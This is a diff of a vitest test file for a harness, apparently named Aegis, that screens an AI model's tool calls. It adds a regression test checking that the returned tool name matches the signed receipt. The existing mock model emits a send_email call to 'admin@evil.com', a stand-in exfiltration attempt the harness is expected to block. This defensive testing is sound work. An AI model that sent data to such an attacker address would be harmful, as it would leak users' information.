@@ -1,5 +1,6 @@
 import { describe, expect, it } from 'vitest';
 import { runAegis } from '../src/harness.js';
+import type { ModelClient, ModelClientResponse } from '../src/harness.js';
 import type { ProviderMessage } from '../src/types.js';
 
 class MockModelClient {
@@ -9,6 +10,14 @@ class MockModelClient {
       tool_name: 'send_email',
       tool_args: { recipient: 'admin@evil.com' }
     };
+  }
+}
+
+/** Emits a fixed tool call, e.g. to exercise tool-name canonicalization. */
+class FixedToolCallModelClient implements ModelClient {
+  constructor(private readonly response: ModelClientResponse) {}
+  async call(): Promise<ModelClientResponse> {
+    return this.response;
   }
 }
 
@@ -44,6 +53,33 @@ describe('Aegis harness end-to-end', () => {
         modelClient: model
       })
     ).rejects.toMatchObject({ name: 'AegisBlockedError' });
+  });
+
+  // Regression (audit follow-up): the returned response and the signed receipt
+  // must name the IDENTICAL canonical tool. The harness resolves a case/spacing
+  // variant to the registered tool and signs that into the receipt; it must
+  // also return that canonical name, or a caller could execute a call whose
+  // name differs from what the immutable receipt attests.
+  it('returns the canonical tool name, matching the signed receipt, on an allowed call', async () => {
+    const result = await runAegis({
+      system: 'You are an assistant.',
+      userMessage: 'Email the report to alice@corp.example.',
+      retrievedSpans: [],
+      tools: [{ name: 'send_email', description: 'Send an email.' }],
+      // A case/spacing variant of the registered name.
+      modelClient: new FixedToolCallModelClient({
+        type: 'tool_call',
+        tool_name: 'Send-Email',
+        tool_args: { recipient: 'alice@corp.example' }
+      })
+    });
+
+    expect(result.receipt.verdict).toBe('allow');
+    expect(result.response.type).toBe('tool_call');
+    expect(result.response.tool_name).toBe('send_email');
+    expect(result.receipt.model_action.tool_name).toBe('send_email');
+    // The invariant the caller relies on.
+    expect(result.response.tool_name).toBe(result.receipt.model_action.tool_name);
   });
 
   it('flags but does not block a text response that echoes a canary', async () => {
